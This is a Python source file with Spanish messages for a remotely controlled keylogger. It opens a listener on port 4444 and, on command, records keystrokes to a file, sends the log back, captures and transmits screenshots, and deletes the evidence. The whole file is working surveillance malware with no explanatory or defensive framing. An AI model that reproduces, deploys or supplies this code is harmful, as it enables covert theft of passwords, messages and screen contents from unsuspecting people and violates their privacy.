import socket
import threading
import os
import time
import datetime
from pynput import keyboard
from PIL import ImageGrab

HOST = "0.0.0.0"
PORT = 4444
LOG_FILE = "keylog.txt"
SCREENSHOT_FILE = "screenshot.png"

keylog_active = False
log = []

def save_log(key):
    global keylog_active
    if not keylog_active:
        return
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.datetime.now()}] {key}\n")
    except:
        pass

def start_keylogger():
    global keylog_active
    keylog_active = True

    def on_press(key):
        try:
            save_log(key.char)
        except AttributeError:
            save_log(str(key))

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def get_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            return f.read()
    return "[Log vacío]"

def take_screenshot():
    img = ImageGrab.grab()
    img.save(SCREENSHOT_FILE)
    with open(SCREENSHOT_FILE, "rb") as f:
        return f.read()

def delete_all():
    try:
        os.remove(LOG_FILE)
        os.remove(SCREENSHOT_FILE)
        return "[Archivos eliminados]"
    except:
        return "[Nada que borrar]"

def handle_client(conn):
    with conn:
        data = conn.recv(1024).decode()
        if data == "PING":
            conn.sendall(b"OK")
        elif data == "START":
            start_keylogger()
            conn.sendall(b"Keylogger iniciado")
        elif data == "GET_LOG":
            conn.sendall(get_log().encode())
        elif data == "GET_IMAGE":
            img_data = take_screenshot()
            conn.sendall(img_data)
        elif data == "DELETE_ALL":
            response = delete_all()
            conn.sendall(response.encode())
        else:
            conn.sendall(b"Comando desconocido")

def server_loop():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[+] Esperando comandos en {HOST}:{PORT}...")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn,), daemon=True).start()

if __name__ == "__main__":
    server_loop()
